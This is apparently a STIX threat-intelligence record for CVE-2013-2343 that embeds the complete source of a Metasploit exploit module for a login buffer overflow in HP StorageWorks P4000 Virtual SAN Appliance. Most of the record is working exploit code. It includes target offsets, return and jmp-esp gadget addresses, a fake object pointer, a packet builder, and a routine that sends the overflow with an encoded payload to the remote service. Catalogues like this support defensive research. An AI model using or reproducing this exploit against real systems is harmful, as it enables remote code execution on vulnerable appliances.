{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--63e77027-d692-4476-a25b-7d46a5fbe9a5",
    "created": "2024-08-14T16:57:39.300874Z",
    "modified": "2024-08-14T16:57:39.300878Z",
    "name": "\"HP StorageWorks P4000 Virtual SAN Appliance Login Buffer Overflow\"",
    "description": " This module exploits a buffer overflow vulnerability found in HP's StorageWorks P4000 VSA on versions prior to 10.0. The vulnerability is due to an insecure usage of the sscanf() function when parsing login requests. This module has been tested successfully on the HP VSA 9 Virtual Appliance.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/misc/hp_vsa_login_bof.rb",
            "external_id": "hp_vsa_login_bof.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-2343"
        },
        {
            "source_name": "reference",
            "url": "http://h20564.www2.hpe.com/hpsc/doc/public/display?docId=emr_na-c03661318"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"HP StorageWorks P4000 Virtual SAN Appliance Login Buffer Overflow\",\n      'Description'    => %q{\n        This module exploits a buffer overflow vulnerability found in HP's StorageWorks\n        P4000 VSA on versions prior to 10.0. The vulnerability is due to an insecure usage\n        of the sscanf() function when parsing login requests. This module has been tested\n        successfully on the HP VSA 9 Virtual Appliance.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'e6af8de8b1d4b2b6d5ba2610cbf9cd38', # Vulnerability Discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'References'     =>\n        [\n          ['CVE', '2013-2343'],\n          ['OSVDB', '94701'],\n          ['ZDI', '13-179'],\n          ['URL', 'http://h20564.www2.hpe.com/hpsc/doc/public/display?docId=emr_na-c03661318']\n        ],\n      'Payload'        =>\n        {\n          'BadChars'       => \"\\x2f\\x00\\x0d\\x0a\",\n          'Space'          => 780,\n          'DisableNops'    => true,\n          'PrependEncoder' => \"\\x81\\xc4\\x54\\xf2\\xff\\xff\" # Stack adjustment # add esp, -3500\n        },\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC' => 'thread'\n        },\n      'Platform'       => ['linux'],\n      'Arch'           => ARCH_X86,\n      'Targets'        =>\n        [\n          [ 'HP VSA 9',\n            {\n              'Version'    => '9.0.0',\n              'Offset'     => 3446,\n              'Ret'        => 0x0804EB34, # pop ebp # ret # from hydra\n              'FakeObject' => 0x08072E58, # from hydra data\n              'JmpEsp'     => 0x08050CB8  # push esp # ret # from hydra\n            }\n          ]\n        ],\n      'Privileged'     => true,\n      'DisclosureDate' => '2013-06-28',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptPort.new('RPORT', [true, 'The remote port', 13838])\n      ])\n  end\n\n  def check\n    connect\n    packet = generate_packet(\"login:/global$agent/L0CAlu53R/Version \\\"#{target['Version']}\\\"\")\n    vprint_status(\"#{rhost}:#{rport} Sending login packet to check...\")\n    sock.put(packet)\n    res = sock.get_once\n    disconnect\n\n    if res and res=~ /OK/ and res =~ /Login/\n      return Exploit::CheckCode::Appears\n    elsif res and res =~ /FAILED/ and res =~ /version/\n      return Exploit::CheckCode::Detected\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def generate_packet(data)\n    pkt = \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\"\n    pkt << [data.length + 1].pack(\"N*\")\n    pkt << \"\\x00\\x00\\x00\\x00\"\n    pkt << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    pkt << \"\\x00\\x00\\x00\\x14\\xff\\xff\\xff\\xff\"\n    pkt << data\n    pkt << \"\\x00\"\n\n    pkt\n  end\n\n  def exploit\n    connect\n    print_status(\"#{rhost}:#{rport} Sending login packet\")\n    my_bof = rand_text(target['Offset'])\n    my_bof << [target.ret].pack(\"V\")\n    my_bof << [target['FakeObject']].pack(\"V\") # Pointer to Fake Object in order to survive LHNSessionManager::SendMessage before ret\n    my_bof << [target['JmpEsp']].pack(\"V\")\n    my_bof << payload.encoded\n\n    packet = generate_packet(\"login:/#global$agent/#{my_bof}/#{rand_text_alpha(5)}/Version \\\"1\\\" \") # Fake version in order to ret asap\n    sock.put(packet)\n    disconnect\n  end\nend\n\n",
    "x_mitre_disclosure_date": "2013-06-28",
    "x_mitre_platforms": [
        "['linux']"
    ]
}